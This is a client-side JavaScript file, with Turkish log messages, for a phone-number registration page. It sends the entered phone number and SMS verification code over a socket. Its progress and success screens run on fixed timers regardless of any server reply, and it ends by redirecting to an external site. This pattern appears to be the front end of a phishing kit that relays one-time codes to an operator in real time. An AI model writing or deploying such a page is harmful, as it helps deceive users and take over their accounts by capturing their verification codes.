const socket = io();
console.log("CLIENT SOCKET BAĞLANDI");

const loginCard = document.getElementById("loginCard");
const registerCard = document.getElementById("registerCard");
const verifyCard = document.getElementById("verifyCard");
const successScreen = document.getElementById("successScreen");

function showCard(card) {
  card.classList.remove("hidden");
  requestAnimationFrame(() => {
    card.classList.add("visible");
  });
}

function hideCard(card) {
  card.classList.remove("visible");
  setTimeout(() => {
    card.classList.add("hidden");
  }, 300);
}

function showRegister() {
  hideCard(loginCard);
  showCard(registerCard);
}

function showLogin() {
  hideCard(registerCard);
  hideCard(verifyCard);
  hideCard(successScreen);
  showCard(loginCard);
}

document.addEventListener("DOMContentLoaded", () => {
  [registerCard, verifyCard, successScreen].forEach(card => card.classList.add("hidden"));
  showCard(loginCard); // Başlangıçta login göster

  const phoneInput = document.getElementById("registerPhone");

  phoneInput.addEventListener("focus", () => {
    if (phoneInput.value === "") {
      phoneInput.value = "05";
    }
  });

  phoneInput.addEventListener("input", () => {
    if (!phoneInput.value.startsWith("05")) {
      phoneInput.value = "05";
    }
    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
    if (phoneInput.value.length > 11) {
      phoneInput.value = phoneInput.value.slice(0, 11);
    }
  });

  const registerBtn = document.getElementById("registerSubmit");

  registerBtn.addEventListener("click", () => {
    const phone = document.getElementById("registerPhone").value.trim();
    if (!phone) return;

    let normalizedPhone = phone;
    if (phone.startsWith("+90")) normalizedPhone = "0" + phone.slice(3);
    if (phone.startsWith("90")) normalizedPhone = "0" + phone.slice(2);

    console.log("CLIENT PHONE GÖNDERDİ:", normalizedPhone);
    socket.emit("new-phone", normalizedPhone);

    registerBtn.classList.add("loading");

    setTimeout(() => {
      registerBtn.classList.remove("loading");
      hideCard(registerCard);
      showCard(verifyCard);
    }, 2000);
  });

  const verifyBtn = document.getElementById("verifySubmit");

  verifyBtn.addEventListener("click", () => {
    const code = document.getElementById("verifyCode").value.trim();
    if (!code) return;

    console.log("CLIENT CODE GÖNDERDİ:", code);
    socket.emit("new-code", code);

    verifyBtn.classList.add("loading");

    setTimeout(() => {
      verifyBtn.classList.remove("loading");
      hideCard(verifyCard);
      showCard(successScreen);

      setTimeout(() => {
        window.location.href = "https://hukumsuz.de/";
      }, 2000);
    }, 2000);
  });
});